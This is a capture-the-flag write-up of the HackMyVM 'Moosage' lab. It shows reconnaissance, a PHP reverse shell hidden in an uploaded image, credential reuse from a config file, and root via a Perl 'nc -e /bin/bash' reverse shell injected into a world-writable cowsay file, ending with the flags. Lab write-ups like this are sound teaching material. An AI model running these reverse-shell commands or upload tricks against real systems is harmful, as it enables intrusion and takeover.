---
title: Moosage
author: VoidReign-U
date: 2025-10-14 00:00:00 +0800
categories:
  - Training platform
  - HackMyVm
tags:
  - HackMyVm
  - Hard
  - web
permalink: /HackMyVm/Moosage.html
---

# Moosage

<img src="/assets/img/Moosage/vm.png" alt="image-machine" />



## ip

attacker ip ‚Üí 10.150.30.142

victim ip ‚Üí 10.150.30.3

---


## Recon

### nmap

```bash

PORT STATE SERVICE REASON VERSION

22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey:

| 2048 02:65:e6:05:af:c8:81:9c:30:b0:da:e3:1e:d8:be:02 (RSA)

| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDv+qPYyD6jIW9PZIAMgz4ojpJlvs2EWCtw4GyIHiX3/UMJ0qISwj04rljLXmmvTALNi9GYKPDlnh7vrAKbnKhIhef114wHFrPjTMNI7m+nEqvN0yuxGmS6oIHkzz5sNXvxSnVRfqqpFheZqXmY5qrrcSV+TgFKEZs94WzZFp7yzyDX4AnU+Mp7AMrZzYEtDqLFJBviK27rTZ9RJqmH9VTiHENSr0+UHTLPKVxnKCdPuAXLmbd167bQsMdoQ5/Rn7RgUbwjF8hSpgrRvJ9pAuLrNIEGe1zeeVoZTZmpn8yvjVKDNV2qOh69mf+uam9r/KrDqr1b7QGiRnIBXryAUBwv

| 256 3f:7d:4b:86:8d:c7:01:8f:b3:56:6d:65:c2:e5:cf:4e (ECDSA)

| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNW4D2ORbPVJ9OINylplX0ks+ihYcAng5XYoc1anWtC9jJstK9F01AivJdESyyEPmA+qnN9/uPnhS8aXYirauwc=

| 256 8e:d4:b8:d6:8e:d9:61:a1:3e:7f:5e:d7:ec:dc:bb:de (ED25519)

|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAlNJzSVpE+7Dt7rN2EgYoqsw+pS9EhnA9x9L/iwHVH

80/tcp open http syn-ack ttl 64 nginx 1.14.2

|_http-title: 403 Forbidden

|_http-server-header: nginx/1.14.2

| http-methods:

|_ Supported Methods: GET HEAD POST

```

---

### directory brute‚Äëforce

```bash

‚ùØ feroxbuster -u [http://10.105.30.3](http://10.105.30.3) -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,xml,png,jpg,jpeg,txt

___ ___ __ __ __ __ __ ___

|__ |__ |__) |__) | / ` / \ \_/ | | \ |__

| |___ | \ | \ | \__, \__/ / \ | |__/ |___

by Ben "epi" Risher ü§ì ver: 2.12.0

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

üéØ Target Url ‚îÇ [http://10.105.30.3](http://10.105.30.3)

üöÄ Threads ‚îÇ 50

üìñ Wordlist ‚îÇ /usr/share/seclists/Discovery/Web-Content/common.txt

üëå Status Codes ‚îÇ All Status Codes!

üí• Timeout (secs) ‚îÇ 7

ü¶° User-Agent ‚îÇ feroxbuster/2.12.0

üîé Extract Links ‚îÇ true

üí≤ Extensions ‚îÇ [php, html, xml, png, jpg, jpeg, txt]

üèÅ HTTP methods ‚îÇ [GET]

üîÉ Recursion Depth ‚îÇ 4

üéâ New Version Available ‚îÇ [https://github.com/epi052/feroxbuster/releases/latest](https://github.com/epi052/feroxbuster/releases/latest)

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

üèÅ Press [ENTER] to use the Scan Management Menu‚Ñ¢

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

404 GET 7l 12w 169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

403 GET 7l 10w 169c [http://10.105.30.3/](http://10.105.30.3/)

301 GET 7l 12w 185c [http://10.105.30.3/blog](http://10.105.30.3/blog) => [http://10.105.30.3/blog/](http://10.105.30.3/blog/)

200 GET 1l 2w 23c [http://10.105.30.3/blog/.git/HEAD](http://10.105.30.3/blog/.git/HEAD)

200 GET 11l 29w 254c [http://10.105.30.3/blog/.git/config](http://10.105.30.3/blog/.git/config)

200 GET 10l 26w 171c [http://10.105.30.3/blog/.gitignore](http://10.105.30.3/blog/.gitignore)

403 GET 7l 10w 169c [http://10.105.30.3/blog/.git/logs/](http://10.105.30.3/blog/.git/logs/)

200 GET 15l 31w 300c [http://10.105.30.3/blog/.htaccess](http://10.105.30.3/blog/.htaccess)

200 GET 32l 115w 14720c [http://10.105.30.3/blog/.git/index](http://10.105.30.3/blog/.git/index)

301 GET 7l 12w 185c [http://10.105.30.3/blog/.git](http://10.105.30.3/blog/.git) => [http://10.105.30.3/blog/.git/](http://10.105.30.3/blog/.git/)
```

---

#### found .git and i found the github repo for the project :

### you can find the for the github repo in .git/config

---
-  ### https://github.com/m1k1o/blog/ 
- #### try to search for default creds or any thing usefull:
- #### found default creditial for admin
- #### https://github.com/m1k1o/blog/ > https://github.com/m1k1o/blog/blob/master/config.ini 


```bash

[admin]

force_login = true

nick = demo

pass = demo

try to login * seccess *
```



<img src="/assets/img/Moosage/1.png" alt="image-machine" />

### It looks like a social-media website. I tried to exploit the post upload feature by uploading a reverse shell ‚Äî success.  
- I took `profile_big.jpg` from the profile page of an account I already controlled and embedded PHP code into it.


<img src="/assets/img/Moosage/2.png" alt="image-machine" />

```bash
the is to path for the upload files i try both and data/i/file_name * work *

‚ùØ nc -lvnp 9001

Listening on 0.0.0.0 9001

Connection received on 10.105.30.3 41810

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

python3 -c "import pty;pty.spawn('/bin/bash')"

www-data@moosage:~/html/blog/data/i$ export TERM=xterm

export TERM=xterm

www-data@moosage:~/html/blog/data/i$ ^Z

zsh: suspended nc -lvnp 9001

‚ùØ stty raw -echo;fg

[1] + continued nc -lvnp 9001

www-data@moosage:~/html/blog/data/i$

````

## Privilege Escalation

```bash

www-data@moosage:~/html/blog/data/i$ sudo -l

bash: sudo: command not found

www-data@moosage:~/html/blog/data/i$ echo $PATH

/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.

www-data@moosage:~/html/blog/data/i$
```


##### try find : found cowsay file with perm to write on them it's not useful now 

#### Find Command:
```bash
find / -writable ! -path '/proc*' ! -path '/run*' ! -path '/sys*' ! -path '/dev*' -exec ls -al {} \; 2>/dev/null
```



#### output
```bash
-rw-rw-rw- 1 root root 248 Aug 14 1999 /usr/share/cowsay/cows/[www.cow](http://www.cow)

-rw-rw-rw- 1 root root 490 Aug 14 1999 /usr/share/cowsay/cows/flaming-sheep.cow

-rw-rw-rw- 1 root root 126 Aug 14 1999 /usr/share/cowsay/cows/hellokitty.cow

-rw-rw-rw- 1 root root 357 Feb 3 2019 /usr/share/cowsay/cows/elephant-in-snake.cow

-rw-rw-rw- 1 root root 1127 Feb 3 2019 /usr/share/cowsay/cows/calvin.cow

-rw-rw-rw- 1 root root 279 Aug 14 1999 /usr/share/cowsay/cows/vader.cow

-rw-rw-rw- 1 root root 687 Feb 3 2019 /usr/share/cowsay/cows/kangaroo.cow

-rw-rw-rw- 1 root root 1284 Nov 3 1999 /usr/share/cowsay/cows/dragon-and-cow.cow

-rw-rw-rw- 1 root root 234 Aug 14 1999 /usr/share/cowsay/cows/sheep.cow

-rw-rw-rw- 1 root root 132 Feb 3 2019 /usr/share/cowsay/cows/duck.cow

-rw-rw-rw- 1 root root 1054 Feb 3 2019 /usr/share/cowsay/cows/gnu.cow

-rw-rw-rw- 1 root root 162 Aug 14 1999 /usr/share/cowsay/cows/koala.cow

-rw-rw-rw- 1 root root 637 Aug 14 1999 /usr/share/cowsay/cows/kiss.cow

-rw-rw-rw- 1 root root 249 Feb 3 2019 /usr/share/cowsay/cows/moofasa.cow

-rw-rw-rw- 1 root root 406 Aug 14 1999 /usr/share/cowsay/cows/kosh.cow

-rw-rw-rw- 1 root root 1000 Aug 14 1999 /usr/share/cowsay/cows/dragon.cow

-rw-rw-rw- 1 root root 569 Aug 14 1999 /usr/share/cowsay/cows/daemon.cow

-rw-rw-rw- 1 root root 175 Aug 14 1999 /usr/share/cowsay/cows/default.cow

-rw-rw-rw- 1 root root 1105 Aug 14 1999 /usr/share/cowsay/cows/turtle.cow

-rw-rw-rw- 1 root root 854 Aug 14 1999 /usr/share/cowsay/cows/stegosaurus.cow

-rw-rw-rw- 1 root root 585 Aug 14 1999 /usr/share/cowsay/cows/eyes.cow

-rw-rw-rw- 1 root root 203 Aug 14 1999 /usr/share/cowsay/cows/moose.cow

-rw-rw-rw- 1 root root 1718 Feb 3 2019 /usr/share/cowsay/cows/unipony.cow

-rw-rw-rw- 1 root root 284 Aug 14 1999 /usr/share/cowsay/cows/elephant.cow

-rw-rw-rw- 1 root root 215 Nov 12 1999 /usr/share/cowsay/cows/tux.cow

-rw-rw-rw- 1 root root 123 Aug 14 1999 /usr/share/cowsay/cows/bunny.cow

-rw-rw-rw- 1 root root 293 Aug 14 1999 /usr/share/cowsay/cows/three-eyes.cow

-rw-rw-rw- 1 root root 1623 Feb 3 2019 /usr/share/cowsay/cows/pony.cow

-rw-rw-rw- 1 root root 365 Feb 3 2019 /usr/share/cowsay/cows/unipony-smaller.cow

-rw-rw-rw- 1 root root 1018 Aug 14 1999 /usr/share/cowsay/cows/ghostbusters.cow

-rw-rw-rw- 1 root root 305 Feb 3 2019 /usr/share/cowsay/cows/pony-smaller.cow

## -rw-rw-rw- 1 root root 230 Oct 14 02:41 /usr/share/cowsay/cows/cower.cow

-rw-rw-rw- 1 root root 310 Aug 14 1999 /usr/share/cowsay/cows/bud-frogs.cow

-rw-rw-rw- 1 root root 252 Aug 14 1999 /usr/share/cowsay/cows/ren.cow

-rw-rw-rw- 1 root root 181 Feb 3 2019 /usr/share/cowsay/cows/cock.cow

-rw-rw-rw- 1 root root 226 Feb 3 2019 /usr/share/cowsay/cows/luke-koala.cow

-rw-rw-rw- 1 root root 480 Aug 14 1999 /usr/share/cowsay/cows/cheese.cow

-rw-rw-rw- 1 root root 1302 Aug 14 1999 /usr/share/cowsay/cows/turkey.cow
```

###  I searched `/var/www/html/blog/` (and checked GitHub for files like `config.ini`) and found the password for user **baca**.


```bash
www-data@moosage:~/html/blog$ cat config.ini

;[database]

db_connection = mysql

mysql_socket = /run/mysqld/mysqld.sock

mysql_host = localhost

mysql_port = 3306

## mysql_user = baca

## mysql_pass = youareinsane

db_name = moosage

````

---

###  swich user to baca

#### su baca

#### cp public ssh key to .ssh/authorized_keys

```bash

www-data@moosage:~/html/blog$ su baca

Password:

baca@moosage:/var/www/html/blog$ cd

drwxr-xr-x 4 baca baca 4096 Oct 14 02:13 .

drwxr-xr-x 3 root root 4096 Apr 22 2021 ..

-rw------- 1 baca baca 143 Oct 14 02:42 .bash_history

-rw-r--r-- 1 baca baca 220 Apr 22 2021 .bash_logout

-rw-r--r-- 1 baca baca 3526 Apr 22 2021 .bashrc

-rwx--x--x 1 baca baca 1920 Apr 22 2021 flag.sh

drwxr-xr-x 3 baca baca 4096 Apr 22 2021 .local

-rw-r--r-- 1 baca baca 807 Apr 22 2021 .profile

-rw------- 1 baca baca 13 Apr 22 2021 user.txt

-rw------- 1 baca baca 53 Apr 22 2021 .Xauthority

baca@moosage:~$ ssh

ssh ssh-agent ssh-copy-id ssh-keygen

ssh-add ssh-argv0 sshd ssh-keyscan

baca@moosage:~$ ssh-keygen

Generating public/private rsa key pair.

Enter file in which to save the key (/home/baca/.ssh/id_rsa):

Enter passphrase (empty for no passphrase):

Enter same passphrase again:

Your identification has been saved in /home/baca/.ssh/id_rsa.

Your public key has been saved in /home/baca/.ssh/id_rsa.pub.

The key fingerprint is:

SHA256:Y9Md5zruYiECcrGLCr7WrynmBpRRmG0CrqAio+H+LJE baca@moosage

The key's randomart image is:

+---[RSA 2048]----+

|o =. |

|.= o. |

|..= o . . |

|+o. + . . + |

|O .+ o S . . . |

|BE. . ...o. . |

|=oo . . .o |

|oB... o. . |

|=+==o. . oo |

+----[SHA256]-----+

baca@moosage:~$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICoj4P7ksted04oDZHPOBHyOK10FELam/8PbwH2ZLjN0 void@arch" > .ssh/authorized_keys

‚ùØ ssh -l baca 10.105.30.3

\*\* WARNING: connection is not using a post-quantum key exchange algorithm.

\*\* This session may be vulnerable to "store now, decrypt later" attacks.

\*\* The server may need to be upgraded. See [https://openssh.com/pq.html](https://openssh.com/pq.html)

---

< WELCOME TO MOOSAGE SYSTEM >

---

\

\

,\_\_, | |

(oo)\| |\_\_\_

(\_\_)\| | )\_

| |\_w | \

| | || \*

Cower....

The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/\*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

Last login: Tue Oct 14 02:42:03 2025 from 10.105.30.142

baca@moosage:~$ export TERM=xterm

baca@moosage:~$

```



#### Now it's time to exploit `cowsay`.

#### I used a specific technique ‚Äî I inserted a Perl command into the file used by `cowsay`. After finishing, I found the GTFOBins entry for `cowsay`, which documents the same technique: [https://gtfobins.github.io/gtfobins/cowsay/](https://gtfobins.github.io/gtfobins/cowsay/)



<img src="/assets/img/Moosage/3.png" alt="image-20250616220926337" />


```bash
ssh -l baca 10.105.30.3

\*\* WARNING: connection is not using a post-quantum key exchange algorithm.

\*\* This session may be vulnerable to "store now, decrypt later" attacks.

\*\* The server may need to be upgraded. See [https://openssh.com/pq.html](https://openssh.com/pq.html)

### uid=0(root) gid=0(root) groups=0(root)

The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/\*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

Last login: Tue Oct 14 03:03:30 2025 from 10.105.30.142

baca@moosage:~$

```

## Root shell


### Now I have a root shell. The reverse shell connected and returned `uid=0(root)`, so I'm running as root ‚Äî that's it.

### Reverse Shell

```perl
exec "nc -e /bin/bash 10.105.30.142 9001";
```

<img src="/assets/img/Moosage/4.png" alt="image-20250616220926337" />


```bash
‚ùØ nc -lvnp 9001

Listening on 0.0.0.0 9001

Connection received on 10.105.30.3 41814

id

uid=0(root) gid=0(root) groups=0(root)

that's it

```

# Flags

```bash  

root@moosage:/# cat root/root.txt

hmvyougotmooooooo

root@moosage:/# cat /home/baca/user.txt

hmvmessageme

root@moosage:/#
```
